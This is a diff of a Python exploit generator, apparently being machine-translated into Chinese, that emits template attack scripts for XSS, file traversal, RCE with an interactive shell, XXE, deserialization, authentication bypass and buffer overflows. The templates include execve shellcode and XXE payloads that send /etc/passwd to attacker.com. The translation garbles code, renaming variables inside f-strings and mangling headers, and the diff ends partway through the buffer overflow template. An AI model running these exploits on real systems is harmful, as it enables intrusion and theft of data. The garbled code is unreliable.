-        print(f"[+] Testing reflected XSS on parameter: {{parameter}}")
+        print(f"[+] 正在测试 反射 XSS 在 参数:{{parameter}}")
         
         payloads = self.generate_payloads()
         
@@ -7586,45 +7586,45 @@ class XSSExploit:
                 )
                 
                 if payload in response.text:
-                    print(f"[+] Potential XSS found with payload {{i+1}}: {{payload[:50]}}...")
+                    print(f"[+] 潜在 XSS 发现 使用 载荷{{i+1}}:{{payload[:50]}}...")
                     return True
                     
             except Exception as e:
-                print(f"[-] Error testing payload {{i+1}}: {{e}}")
+                print(f"[-] 错误 测试 载荷{{i+1}}:{{e}}")
                 continue
                 
         return False
     
     def test_stored_xss(self, endpoint="/comment", data_param="comment"):
         """Test for stored XSS"""
-        print(f"[+] Testing stored XSS on endpoint: {{endpoint}}")
+        print(f"[+] 正在测试 存储 XSS 在 端点:{{endpoint}}")
         
         payloads = self.generate_payloads()
         
         for i, payload in enumerate(payloads):
             try:
-                # Submit payload
+                # 提交 载荷
                 response = self.session.post(
                     f"{{self.target_url}}{{endpoint}}",
                     data={{data_param: payload}}
                 )
                 
-                # Check if stored
+                # 检查 if 存储
                 check_response = self.session.get(self.target_url)
                 if payload in check_response.text:
-                    print(f"[+] Stored XSS found with payload {{i+1}}: {{payload[:50]}}...")
+                    print(f"[+] 存储 XSS 发现 使用 载荷{{i+1}}:{{payload[:50]}}...")
                     return True
                     
             except Exception as e:
-                print(f"[-] Error testing stored payload {{i+1}}: {{e}}")
+                print(f"[-] 错误 测试 存储 载荷{{i+1}}:{{e}}")
                 continue
                 
         return False
 
 def main():
     if len(sys.argv) < 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [parameter]")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com/search q")
+        print(f"用法： python3{{sys.argv[0]}}<target_url>[参数]")
+        print(f"示例： python3{{sys.argv[0]}}http://目标.com/search q")
         sys.exit(1)
     
     target_url = sys.argv[1]
@@ -7632,36 +7632,36 @@ def main():
     
     exploit = XSSExploit(target_url)
     
-    print(f"[+] XSS Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
+    print(f"[+] XSS 利用 用于{cve_id}")
+    print(f"[+] 目标：{{target_url}}")
     
     if "{xss_type}" == "reflected" or "{xss_type}" == "unknown":
         if exploit.test_reflected_xss(parameter):
-            print("[+] Reflected XSS vulnerability confirmed!")
+            print("[+] 反射 XSS 漏洞 已确认!")
         else:
-            print("[-] No reflected XSS found")
+            print("[-] 未发现reflected XSS 发现")
     
     if "{xss_type}" == "stored" or "{xss_type}" == "unknown":
         if exploit.test_stored_xss():
-            print("[+] Stored XSS vulnerability confirmed!")
+            print("[+] 存储 XSS 漏洞 已确认!")
         else:
-            print("[-] No stored XSS found")
+            print("[-] 未发现stored XSS 发现")
 
 if __name__ == "__main__":
     main()
 '''
 
     def _generate_file_read_exploit(self, cve_data, target_info, details):
-        """Generate file read/directory traversal exploit"""
+        """生成 文件 read/目录 traversal 利用"""
         cve_id = cve_data.get("cve_id", "")
         parameter = details.get("parameters", ["portal_type"])[0] if details.get("parameters") else "portal_type"
         traversal_type = details.get("traversal_type", "file_read")
         
         return f'''#!/usr/bin/env python3
-# Local File Inclusion (LFI) Exploit for {cve_id}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
-# Parameter: {parameter}
-# Type: {traversal_type}
+# 本地 文件 包含 (LFI) 利用 用于 {cve_id}
+# 漏洞: {cve_data.get("描述", "")[:100]}...
+# 参数: {参数}
+# 类型: {traversal_type}
 
 import requests
 import sys
@@ -7675,24 +7675,24 @@ class FileReadExploit:
     def generate_payloads(self, target_file="/etc/passwd"):
         """Generate directory traversal payloads"""
         payloads = [
-            # Basic traversal
+            # 基础 遍历
             "../" * 10 + target_file.lstrip('/'),
             "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
             
-            # URL encoded
+            # URL 编码
             quote("../") * 10 + target_file.lstrip('/'),
             
-            # Double encoding
+            # 双重 编码
             quote(quote("../")) * 10 + target_file.lstrip('/'),
             
-            # Null byte (for older systems)
+            # 空字节 字节 (用于 较旧 系统)
             "../" * 10 + target_file.lstrip('/') + "%00.txt",
             
-            # Absolute paths
+            # 绝对 路径
             target_file,
             "file://" + target_file,
             
-            # Windows paths
+            # Windows 路径
             "C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
             "C:/windows/system32/drivers/etc/hosts"
         ]
@@ -7701,9 +7701,9 @@ class FileReadExploit:
     
     def test_file_read(self, parameter="{parameter}"):
         """Test LFI vulnerability on WordPress"""
-        print(f"[+] Testing LFI on parameter: {{parameter}}")
+        print(f"[+] 正在测试 LFI 在 参数:{{parameter}}")
         
-        # WordPress-specific files and common targets
+        # WordPress-specific 文件 and 常见 targets
         test_files = [
             "/etc/passwd",
             "/etc/hosts", 
@@ -7725,7 +7725,7 @@ class FileReadExploit:
                         params={{parameter: payload}}
                     )
                     
-                    # Check for common file contents
+                    # 检查 用于 常见 文件 contents
                     indicators = [
                         "root:", "daemon:", "bin:", "sys:",  # /etc/passwd
                         "localhost", "127.0.0.1",  # hosts file
@@ -7734,10 +7734,10 @@ class FileReadExploit:
                     ]
                     
                     if any(indicator in response.text for indicator in indicators):
-                        print(f"[+] File read successful!")
-                        print(f"[+] File: {{target_file}}")
-                        print(f"[+] Payload: {{payload}}")
-                        print(f"[+] Content preview: {{response.text[:200]}}...")
+                        print(f"[+] 文件读取成功!")
+                        print(f"[+] 文件:{{target_file}}")
+                        print(f"[+] 载荷：{{payload}}")
+                        print(f"[+] 内容预览：{{response.text[:200]}}...")
                         return True
                         
                 except Exception as e:
@@ -7747,7 +7747,7 @@ class FileReadExploit:
     
     def read_specific_file(self, filepath, parameter="file"):
         """Read a specific file"""
-        print(f"[+] Attempting to read: {{filepath}}")
+        print(f"[+] 正在尝试 到 读取:{{filepath}}")
         
         payloads = self.generate_payloads(filepath)
         
@@ -7759,22 +7759,22 @@ class FileReadExploit:
                 )
                 
                 if response.status_code == 200 and len(response.text) > 10:
-                    print(f"[+] Successfully read {{filepath}}:")
+                    print(f"[+] 成功 读取{{filepath}}:")
                     print("-" * 50)
-                    print(response.text)
+                    print(f"响应内容：{response.text}")
                     print("-" * 50)
                     return response.text
                     
             except Exception as e:
                 continue
                 
-        print(f"[-] Could not read {{filepath}}")
+        print(f"[-] 无法 读取{{filepath}}")
         return None
 
 def main():
     if len(sys.argv) < 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [parameter] [file_to_read]")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com/view file /etc/passwd")
+        print(f"用法： python3{{sys.argv[0]}}<target_url>[参数] [file_to_read]")
+        print(f"示例： python3{{sys.argv[0]}}http://目标.com/view 文件 /etc/passwd")
         sys.exit(1)
     
     target_url = sys.argv[1]
@@ -7783,30 +7783,30 @@ def main():
     
     exploit = FileReadExploit(target_url)
     
-    print(f"[+] File Read Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
+    print(f"[+] 文件 读取 利用 用于{cve_id}")
+    print(f"[+] 目标：{{target_url}}")
     
     if specific_file:
         exploit.read_specific_file(specific_file, parameter)
     else:
         if exploit.test_file_read(parameter):
-            print("[+] File read vulnerability confirmed!")
+            print("[+] 文件 读取 漏洞 已确认!")
         else:
-            print("[-] No file read vulnerability found")
+            print("[-] 未发现file 读取 漏洞 发现")
 
 if __name__ == "__main__":
     main()
 '''
 
     def _generate_intelligent_generic_exploit(self, cve_data, target_info, details):
-        """Generate intelligent generic exploit based on CVE analysis"""
+        """生成 智能 generic 利用 based 在 CVE 分析"""
         cve_id = cve_data.get("cve_id", "")
         description = cve_data.get("description", "")
         
         return f'''#!/usr/bin/env python3
-# Generic Exploit for {cve_id}
-# Vulnerability: {description[:150]}...
-# Generated based on CVE analysis
+# Generic 利用 用于 {cve_id}
+# 漏洞: {描述[:150]}...
+# 已生成 基于 on CVE 分析
 
 import requests
 import sys
@@ -7820,19 +7820,19 @@ class GenericExploit:
         
     def analyze_target(self):
         """Analyze target for vulnerability indicators"""
-        print(f"[+] Analyzing target for {cve_id}")
+        print(f"[+] 正在分析 目标 用于{cve_id}")
         
         try:
             response = self.session.get(self.target_url)
             
-            # Look for version indicators in response
+            # 查找 用于 版本 指标 in 响应
             headers = response.headers
             content = response.text.lower()
             
-            print(f"[+] Server: {{headers.get('Server', 'Unknown')}}")
-            print(f"[+] Status Code: {{response.status_code}}")
+            print(f"[+] 服务端：{{headers.get('Server', 'Unknown')}}")
+            print(f"[+] 状态码：{{response.status_code}}")
             
-            # Check for software indicators
+            # 检查 用于 软件 指标
             software_indicators = [
                 "{details.get('software', '').lower()}",
                 "version {details.get('version', '')}",
@@ -7840,19 +7840,19 @@ class GenericExploit:
             
             for indicator in software_indicators:
                 if indicator and indicator in content:
-                    print(f"[+] Found software indicator: {{indicator}}")
+                    print(f"[+] 已发现 软件标识:{{indicator}}")
                     return True
                     
         except Exception as e:
-            print(f"[-] Error analyzing target: {{e}}")
+            print(f"[-] 错误 分析 目标:{{e}}")
             
         return False
     
     def test_vulnerability(self):
         """Test for vulnerability presence"""
-        print(f"[+] Testing for {cve_id} vulnerability...")
+        print(f"[+] 正在测试 用于{cve_id}漏洞...")
         
-        # Based on CVE description, generate test cases
+        # 基于 on CVE 描述, generate 测试 用例
         test_endpoints = [
             "/",
             "/admin",
@@ -7863,11 +7863,11 @@ class GenericExploit:
         for endpoint in test_endpoints:
             try:
                 response = self.session.get(f"{{self.target_url}}{{endpoint}}")
-                print(f"[+] {{endpoint}}: {{response.status_code}}")
+                print(f"[+] 端点：{{endpoint}}，状态码：{{response.status_code}}")
                 
-                # Look for error messages or indicators
+                # 查找 用于 error 消息 or 指标
                 if response.status_code in [200, 500, 403]:
-                    print(f"[+] Endpoint {{endpoint}} accessible")
+                    print(f"[+] 端点{{endpoint}}可访问")
                     
             except Exception as e:
                 continue
@@ -7876,68 +7876,68 @@ class GenericExploit:
     
     def exploit(self):
         """Attempt exploitation based on CVE details"""
-        print(f"[+] Attempting exploitation of {cve_id}")
+        print(f"[+] 正在尝试 利用 的{cve_id}")
         
-        # This would be customized based on the specific CVE
-        print(f"[!] Manual exploitation required for {cve_id}")
-        print(f"[!] Vulnerability details: {{'{description[:200]}...'}}")
+        # This would be customized 基于 on the 特定 CVE
+        print(f"[!] 需要手工利用 用于{cve_id}")
+        print(f"[!] 漏洞详情： {{'{description[:200]}...'}}")
         
         return False
 
 def main():
     if len(sys.argv) != 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com")
+        print(f"用法： python3{{sys.argv[0]}}<target_url>")
+        print(f"示例： python3{{sys.argv[0]}}http://目标.com")
         sys.exit(1)
     
     target_url = sys.argv[1]
     exploit = GenericExploit(target_url)
     
-    print(f"[+] Generic Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
+    print(f"[+] 通用 利用 用于{cve_id}")
+    print(f"[+] 目标：{{target_url}}")
     
     if exploit.analyze_target():
-        print("[+] Target may be vulnerable")
+        print("[+] 目标 可能 存在漏洞")
         exploit.test_vulnerability()
         exploit.exploit()
     else:
-        print("[-] Target does not appear to match vulnerability profile")
+        print("[-] 目标不符合预期漏洞特征 到 匹配 漏洞 画像")
 
 if __name__ == "__main__":
     main()
 '''
 
     def _generate_specific_instructions(self, vuln_type, cve_data, target_info, details):
-        """Generate specific usage instructions based on vulnerability type"""
+        """生成 specific usage instructions based 在 漏洞 类型"""
         cve_id = cve_data.get("cve_id", "")
         
         base_instructions = f"""# Exploit for {cve_id}
-# Vulnerability Type: {vuln_type}
-# Software: {details.get('software', 'Unknown')} {details.get('version', '')}
+# 漏洞 类型: {vuln_type}
+# 软件: {详情.get('软件', 'Unknown')} {详情.get('版本', '')}
 
-## Vulnerability Details:
+# # 漏洞 详情:
 {cve_data.get('description', 'No description available')[:300]}...
 
-## Usage Instructions:
+# # 用法 说明:
 1. Ensure target is running vulnerable software version
 2. Test in authorized environment only
 3. Adjust parameters based on target configuration
 4. Monitor for defensive responses
 
-## Basic Usage:
+# # 基础 用法:
 python3 exploit.py <target_url>"""
 
         if vuln_type == "sql_injection":
             return base_instructions + f"""
 
-## SQL Injection Specific:
+# # SQL 注入 特定:
 - Parameter: {details.get('parameters', ['unknown'])[0]}
 - Endpoint: {details.get('endpoints', ['unknown'])[0]}
 - Test with: python3 exploit.py http://target.com
 - The script will automatically test for time-based blind SQL injection
 - If successful, it will attempt to extract database information
 
-## Manual Testing:
+# # 手工 Testing:
 - Add ' after parameter value to test for errors
 - Use SLEEP() or WAITFOR DELAY for time-based testing
 - Try UNION SELECT for data extraction"""
@@ -7945,13 +7945,13 @@ python3 exploit.py <target_url>"""
         elif vuln_type == "xss":
             return base_instructions + f"""
 
-## XSS Specific:
+# # XSS 特定:
 - Type: {details.get('xss_type', 'unknown')}
 - Test with: python3 exploit.py http://target.com parameter_name
 - The script tests both reflected and stored XSS
 - Payloads include basic and advanced bypass techniques
 
-## Manual Testing:
+# # 手工 Testing:
 - Try <script>alert('XSS')</script>
 - Use event handlers: <img src=x onerror=alert('XSS')>
 - Test for filter bypasses"""
@@ -7959,31 +7959,31 @@ python3 exploit.py <target_url>"""
         elif vuln_type == "file_read":
             return base_instructions + f"""
 
-## File Read/Directory Traversal:
+# # 文件 Read/Directory 遍历:
 - Test with: python3 exploit.py http://target.com file_parameter
 - Automatically tests common files (/etc/passwd, etc.)
 - Includes encoding and bypass techniques
 
-## Manual Testing:
+# # 手工 Testing:
 - Try ../../../etc/passwd
 - Test Windows paths: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
 - Use URL encoding for bypasses"""
 
         return base_instructions + f"""
 
-## General Testing:
+# # 通用 Testing:
 - Run: python3 exploit.py <target_url>
 - Check target software version matches vulnerable range
 - Monitor application logs for exploitation attempts
 - Verify patch status before testing"""
 
     def _generate_rce_exploit(self, cve_data, target_info, details):
-        """Generate RCE exploit based on CVE details"""
+        """生成 RCE 利用 based 在 CVE details"""
         cve_id = cve_data.get("cve_id", "")
         
         return f'''#!/usr/bin/env python3
-# Remote Code Execution Exploit for {cve_id}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
+# 远程 代码 执行 利用 用于 {cve_id}
+# 漏洞: {cve_data.get("描述", "")[:100]}...
 
 import requests
 import sys
@@ -7997,49 +7997,49 @@ class RCEExploit:
         
     def test_rce(self, command="id"):
         """Test for RCE vulnerability"""
-        print(f"[+] Testing RCE with command: {{command}}")
+        print(f"[+] 正在测试 RCE 使用 命令:{{command}}")
         
-        # Common RCE payloads
+        # 常见 RCE payloads
         payloads = [
-            # Command injection
+            # 命令 注入
             f"; {{command}}",
             f"| {{command}}",
             f"&& {{command}}",
             f"|| {{command}}",
             
-            # Template injection
+            # 模板 注入
             f"${{{{{{command}}}}}}",
             f"{{{{{{command}}}}}}",
             
-            # Deserialization payloads
+            # 反序列化 payloads
             f"{{command}}",
             
-            # OS command injection
+            # OS 命令 注入
             f"`{{command}}`",
             f"$({{command}})",
         ]
         
         for i, payload in enumerate(payloads):
             try:
-                # Test GET parameters
+                # 测试 GET parameters
                 response = self.session.get(
                     self.target_url,
                     params={{"cmd": payload, "exec": payload, "system": payload}}
                 )
                 
-                # Look for command output indicators
+                # 查找 用于 命令 output 指标
                 if self._check_rce_indicators(response.text, command):
-                    print(f"[+] RCE found with payload {{i+1}}: {{payload}}")
+                    print(f"[+] RCE 发现 使用 载荷{{i+1}}:{{payload}}")
                     return True
                 
-                # Test POST data
+                # 测试 POST data
                 response = self.session.post(
                     self.target_url,
                     data={{"cmd": payload, "exec": payload, "system": payload}}
                 )
                 
                 if self._check_rce_indicators(response.text, command):
-                    print(f"[+] RCE found with POST payload {{i+1}}: {{payload}}")
+                    print(f"[+] RCE 发现 使用 POST 载荷{{i+1}}:{{payload}}")
                     return True
                     
             except Exception as e:
@@ -8062,19 +8062,19 @@ class RCEExploit:
     
     def execute_command(self, command):
         """Execute a specific command"""
-        print(f"[+] Executing command: {{command}}")
+        print(f"[+] 正在执行 命令:{{command}}")
         
         if self.test_rce(command):
-            print(f"[+] Command executed successfully")
+            print(f"[+] 命令 已执行 成功")
             return True
         else:
-            print(f"[-] Command execution failed")
+            print(f"[-] 命令 执行 失败")
             return False
 
 def main():
     if len(sys.argv) < 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [command]")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com id")
+        print(f"用法： python3{{sys.argv[0]}}<target_url>[命令]")
+        print(f"示例： python3{{sys.argv[0]}}http://目标.com id")
         sys.exit(1)
     
     target_url = sys.argv[1]
@@ -8082,13 +8082,13 @@ def main():
     
     exploit = RCEExploit(target_url)
     
-    print(f"[+] RCE Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
+    print(f"[+] RCE 利用 用于{cve_id}")
+    print(f"[+] 目标：{{target_url}}")
     
     if exploit.test_rce(command):
-        print("[+] RCE vulnerability confirmed!")
+        print("[+] RCE 漏洞 已确认!")
         
-        # Interactive shell
+        # 交互 shell
         while True:
             try:
                 cmd = input("RCE> ").strip()
@@ -8099,19 +8099,19 @@ def main():
             except KeyboardInterrupt:
                 break
     else:
-        print("[-] No RCE vulnerability found")
+        print("[-] 未发现RCE 漏洞 发现")
 
 if __name__ == "__main__":
     main()
 '''
 
     def _generate_xxe_exploit(self, cve_data, target_info, details):
-        """Generate XXE exploit based on CVE details"""
+        """生成 XXE 利用 based 在 CVE details"""
         cve_id = cve_data.get("cve_id", "")
         
         return f'''#!/usr/bin/env python3
-# XXE (XML External Entity) Exploit for {cve_id}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
+# XXE (XML 外部 实体) 利用 用于 {cve_id}
+# 漏洞: {cve_data.get("描述", "")[:100]}...
 
 import requests
 import sys
@@ -8124,16 +8124,16 @@ class XXEExploit:
     def generate_xxe_payloads(self):
         """Generate XXE payloads"""
         payloads = [
-            # Basic file read
+            # 基础 文件 read
             '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\\n<root>&xxe;</root>',
             
-            # Windows file read
+            # Windows 文件 read
             '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]>\\n<root>&xxe;</root>',
             
-            # HTTP request (SSRF)
+            # HTTP 请求 (SSRF)
             '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>\\n<root>&xxe;</root>',
             
-            # Parameter entity
+            # 参数 实体
             '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [\\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">\\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \\'http://attacker.com/?%xxe;\\'>">\\n%param1;\\n]>\\n<root>&exfil;</root>'
         ]
         
@@ -8141,7 +8141,7 @@ class XXEExploit:
     
     def test_xxe(self):
         """Test for XXE vulnerability"""
-        print("[+] Testing XXE vulnerability...")
+        print("[+] 正在测试 XXE 漏洞...")
         
         payloads = self.generate_xxe_payloads()
         
@@ -8154,7 +8154,7 @@ class XXEExploit:
                     headers=headers
                 )
                 
-                # Check for file content indicators
+                # 检查 用于 文件 content 指标
                 indicators = [
                     "root:", "daemon:", "bin:",  # /etc/passwd
                     "localhost", "127.0.0.1",   # hosts file
@@ -8162,8 +8162,8 @@ class XXEExploit:
                 ]
                 
                 if any(indicator in response.text for indicator in indicators):
-                    print(f"[+] XXE vulnerability found with payload {{i+1}}")
-                    print(f"[+] Response: {{response.text[:200]}}...")
+                    print(f"[+] XXE 漏洞 发现 使用 载荷{{i+1}}")
+                    print(f"[+] 响应：{{response.text[:200]}}...")
                     return True
                     
             except Exception as e:
@@ -8173,32 +8173,32 @@ class XXEExploit:
 
 def main():
     if len(sys.argv) != 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com/xml")
+        print(f"用法： python3{{sys.argv[0]}}<target_url>")
+        print(f"示例： python3{{sys.argv[0]}}http://目标.com/xml")
         sys.exit(1)
     
     target_url = sys.argv[1]
     exploit = XXEExploit(target_url)
     
-    print(f"[+] XXE Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
+    print(f"[+] XXE 利用 用于{cve_id}")
+    print(f"[+] 目标：{{target_url}}")
     
     if exploit.test_xxe():
-        print("[+] XXE vulnerability confirmed!")
+        print("[+] XXE 漏洞 已确认!")
     else:
-        print("[-] No XXE vulnerability found")
+        print("[-] 未发现XXE 漏洞 发现")
 
 if __name__ == "__main__":
     main()
 '''
 
     def _generate_deserialization_exploit(self, cve_data, target_info, details):
-        """Generate deserialization exploit based on CVE details"""
+        """生成 deserialization 利用 based 在 CVE details"""
         cve_id = cve_data.get("cve_id", "")
         
         return f'''#!/usr/bin/env python3
-# Deserialization Exploit for {cve_id}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
+# 反序列化 利用 用于 {cve_id}
+# 漏洞: {cve_data.get("描述", "")[:100]}...
 
 import requests
 import sys
@@ -8225,11 +8225,11 @@ class DeserializationExploit:
     
     def test_deserialization(self):
         """Test for deserialization vulnerabilities"""
-        print("[+] Testing deserialization vulnerability...")
+        print("[+] 正在测试 反序列化 漏洞...")
         
         test_command = "ping -c 1 127.0.0.1"  # Safe test command
         
-        # Test different serialization formats
+        # 测试 different serialization formats
         payloads = {{
             "pickle": self.create_pickle_payload(test_command),
             "json": json.dumps({{"__type__": "os.system", "command": test_command}}),
@@ -8238,7 +8238,7 @@ class DeserializationExploit:
         
         for format_type, payload in payloads.items():
             try:
-                # Test different parameters
+                # 测试 different parameters
                 test_params = ["data", "payload", "object", "serialized"]
                 
                 for param in test_params:
@@ -8247,9 +8247,9 @@ class DeserializationExploit:
                         data={{param: payload}}
                     )
                     
-                    # Check for deserialization indicators
+                    # 检查 用于 反序列化 指标
                     if response.status_code in [200, 500] and len(response.text) > 0:
-                        print(f"[+] Potential {{format_type}} deserialization found")
+                        print(f"[+] 潜在{{format_type}}反序列化 发现")
                         return True
                         
             except Exception as e:
@@ -8259,32 +8259,32 @@ class DeserializationExploit:
 
 def main():
     if len(sys.argv) != 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com/deserialize")
+        print(f"用法： python3{{sys.argv[0]}}<target_url>")
+        print(f"示例： python3{{sys.argv[0]}}http://目标.com/deserialize")
         sys.exit(1)
     
     target_url = sys.argv[1]
     exploit = DeserializationExploit(target_url)
     
-    print(f"[+] Deserialization Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
+    print(f"[+] 反序列化 利用 用于{cve_id}")
+    print(f"[+] 目标：{{target_url}}")
     
     if exploit.test_deserialization():
-        print("[+] Deserialization vulnerability confirmed!")
+        print("[+] 反序列化 漏洞 已确认!")
     else:
-        print("[-] No deserialization vulnerability found")
+        print("[-] 未发现deserialization 漏洞 发现")
 
 if __name__ == "__main__":
     main()
 '''
 
     def _generate_auth_bypass_exploit(self, cve_data, target_info, details):
-        """Generate authentication bypass exploit"""
+        """生成 认证 bypass 利用"""
         cve_id = cve_data.get("cve_id", "")
         
         return f'''#!/usr/bin/env python3
-# Authentication Bypass Exploit for {cve_id}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
+# Authentication 绕过 利用 用于 {cve_id}
+# 漏洞: {cve_data.get("描述", "")[:100]}...
 
 import requests
 import sys
@@ -8296,7 +8296,7 @@ class AuthBypassExploit:
         
     def test_sql_auth_bypass(self):
         """Test SQL injection authentication bypass"""
-        print("[+] Testing SQL injection auth bypass...")
+        print("[+] 正在测试 SQL 注入 认证 绕过...")
         
         bypass_payloads = [
             "admin' --",
@@ -8320,14 +8320,14 @@ class AuthBypassExploit:
                     data=data
                 )
                 
-                # Check for successful login indicators
+                # 检查 用于 successful login 指标
                 success_indicators = [
                     "dashboard", "welcome", "logout", "admin panel",
                     "successful", "redirect"
                 ]
                 
                 if any(indicator in response.text.lower() for indicator in success_indicators):
-                    print(f"[+] SQL injection bypass successful: {{payload}}")
+                    print(f"[+] SQL 注入 绕过 成功:{{payload}}")
                     return True
                     
             except Exception as e:
@@ -8337,7 +8337,7 @@ class AuthBypassExploit:
     
     def test_header_bypass(self):
         """Test header-based authentication bypass"""
-        print("[+] Testing header-based auth bypass...")
+        print("[+] 正在测试 基于请求头的 认证 绕过...")
         
         bypass_headers = [
             {{"X-Forwarded-For": "127.0.0.1"}},
@@ -8355,7 +8355,7 @@ class AuthBypassExploit:
                 )
                 
                 if response.status_code == 200:
-                    print(f"[+] Header bypass successful: {{headers}}")
+                    print(f"[+] 请求头 绕过 成功:{{headers}}")
                     return True
                     
             except Exception as e:
@@ -8365,41 +8365,41 @@ class AuthBypassExploit:
 
 def main():
     if len(sys.argv) != 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com")
+        print(f"用法： python3{{sys.argv[0]}}<target_url>")
+        print(f"示例： python3{{sys.argv[0]}}http://目标.com")
         sys.exit(1)
     
     target_url = sys.argv[1]
     exploit = AuthBypassExploit(target_url)
     
-    print(f"[+] Authentication Bypass Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
+    print(f"[+] 认证 绕过 利用 用于{cve_id}")
+    print(f"[+] 目标：{{target_url}}")
     
     success = False
     if exploit.test_sql_auth_bypass():
-        print("[+] SQL injection authentication bypass confirmed!")
+        print("[+] SQL 注入 认证 绕过 已确认!")
         success = True
         
     if exploit.test_header_bypass():
-        print("[+] Header-based authentication bypass confirmed!")
+        print("[+] 基于请求头的 认证 绕过 已确认!")
         success = True
         
     if not success:
-        print("[-] No authentication bypass found")
+        print("[-] 未发现authentication 绕过 发现")
 
 if __name__ == "__main__":
     main()
 '''
 
     def _generate_buffer_overflow_exploit(self, cve_data, target_info, details):
-        """Generate buffer overflow exploit"""
+        """生成 buffer overflow 利用"""
         cve_id = cve_data.get("cve_id", "")
         arch = target_info.get("target_arch", "x64")
         
         return f'''#!/usr/bin/env python3
-# Buffer Overflow Exploit for {cve_id}
-# Architecture: {arch}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
+# 缓冲区 溢出 利用 用于 {cve_id}
+# 架构: {arch}
+# 漏洞: {cve_data.get("描述", "")[:100]}...
 
 import struct
 import socket
@@ -8420,13 +8420,13 @@ class BufferOverflowExploit:
     def generate_shellcode(self):
         """Generate shellcode for {arch}"""
         if "{arch}" == "x86":
-            # x86 execve("/bin/sh") shellcode
+            # 说明：x86 execve("/bin/sh") Shellcode
             shellcode = (
                 "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
                 "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
             )
         else:
-            # x64 execve("/bin/sh") shellcode
+            # 说明：x64 execve("/bin/sh") Shellcode
             shellcode = (
                 "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73"
                 "\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
@@ -8436,58 +8436,58 @@ class BufferOverflowExploit:
     
     def create_exploit(self, offset=140):
         """Create buffer overflow exploit"""
-        print(f"[+] Creating buffer overflow exploit...")
-        print(f"[+] Offset: {{offset}} bytes")
+        print(f"[+] 正在创建 缓冲区 溢出 利用...")
+        print(f"[+] 偏移量：{{offset}}字节")
         
-        # Pattern to reach return address
+        # 说明：Pattern to reach return address
         padding = "A" * offset
         
         if "{arch}" == "x86":
-            # x86 return address (example)
+            # 说明：x86 return address (example)
             ret_addr = struct.pack("<I", 0x08048080)  # Adjust for target
         else:
-            # x64 return address (example)
+            # 说明：x64 return address (example)
             ret_addr = struct.pack("<Q", 0x0000000000401000)  # Adjust for target
         
-        # NOP sled
+        # 说明：NOP sled
         nop_sled = "\\x90" * 16
         
-        # Shellcode
+        # 说明：Shellcode
         shellcode = self.generate_shellcode()
         
         exploit = padding.encode() + ret_addr + nop_sled.encode('latin-1') + shellcode
         
-        print(f"[+] Exploit size: {{len(exploit)}} bytes")
+        print(f"[+] 利用大小：{{len(exploit)}}字节")
         return exploit
     
     def send_exploit(self, payload):
         """Send exploit to target"""
         try:
-            print(f"[+] Connecting to {{self.target_host}}:{{self.target_port}}")
+            print(f"[+] 正在连接 到{{self.target_host}}:{{self.target_port}}")
             
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((self.target_host, self.target_port))
             
-            print("[+] Sending exploit...")
+            print("[+] 正在发送 利用...")
             sock.send(payload)
             
-            # Try to interact
+            # 说明：Try to interact
             try:
                 response = sock.recv(1024)
-                print(f"[+] Response: {{response}}")
+                print(f"[+] 响应：{{response}}")
             except:
                 pass
                 
             sock.close()
-            print("[+] Exploit sent successfully")
+            print("[+] 利用发送成功")
             
         except Exception as e:
-            print(f"[-] Error: {{e}}")
+            print(f"[-] 错误：{{e}}")
 
 def main():
     if len(sys.argv) != 3:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_host> <target_port>")
-        print(f"Example: python3 {{sys.argv[0]}} 192.168.1.100 9999")
+        print(f"用法： python3{{sys.argv[0]}}<target_host><target_port>")
+        print(f"示例： python3{{sys.argv[0]}}192.168.1.100 9999")
         sys.exit(1)
     
     target_host = sys.argv[1]
@@ -8495,11 +8495,11 @@ def main():
     
